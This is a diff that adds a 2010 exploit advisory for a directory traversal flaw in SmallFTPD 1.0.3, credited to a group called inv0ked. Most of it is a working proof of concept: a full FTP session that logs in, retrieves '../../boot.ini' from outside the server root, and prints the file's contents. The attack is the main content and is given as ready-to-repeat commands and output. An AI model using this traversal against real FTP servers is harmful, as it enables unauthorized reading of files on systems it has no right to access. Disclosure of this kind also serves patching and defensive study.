@@ -1,0 +1,56 @@
+#     _             ____  __            __    ___ 
+#    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ |
+#   / // __ \ | / / / / / //_/ _ \/ __  /  / / / /
+#  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / / 
+# /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/  
+#                   Live by the byte     |_/_/  
+#
+# Members:
+#
+# Pr0T3cT10n
+# -=M.o.B.=-
+# TheLeader
+# Sro
+#
+# Contact: inv0ked.israel@gmail.com
+#
+# -----------------------------------
+# SmallFTPD is vulnerable for a path traversal, the following will explain you how to read  files
+# The vulnerability allows an unprivileged attacker to read files whom he has no permissions to.
+# The vulnerable FTP command are:
+# * GET 	- Read File
+#-----------------------------------
+# Vulnerability Title: SmallFTPD v1.0.3 Remote Directory Traversal Vulnerability
+# Date: 31/10/2010
+# Author: Pr0T3cT10n
+# Software Link: http://sourceforge.net/projects/smallftpd/files/smallftpd/smallftpd-1.0.3-fix/smallftpd-1.0.3-fix.zip/download
+# Affected Version: 1.0.3
+# Tested on Windows XP Hebrew, Service Pack 3
+# ISRAEL, NULLBYTE.ORG.IL
+###
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Admin>ftp 127.0.0.1
+Connected to 127.0.0.1.
+220- smallftpd 1.0.3
+220- check http://smallftpd.free.fr for more information
+220 report bugs to smallftpd@free.fr
+User (127.0.0.1:(none)): test
+331 User name okay, password required.
+Password:
+230 User logged in.
+ftp> get ../../boot.ini
+200 Port command successful.
+150 Data connection ready.
+226 Transfer complete.
+ftp: 211 bytes received in 0.00Seconds 211000.00Kbytes/sec.
+ftp> bye
+221 Good bye.
+
+C:\Documents and Settings\Admin>type boot.ini
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional"
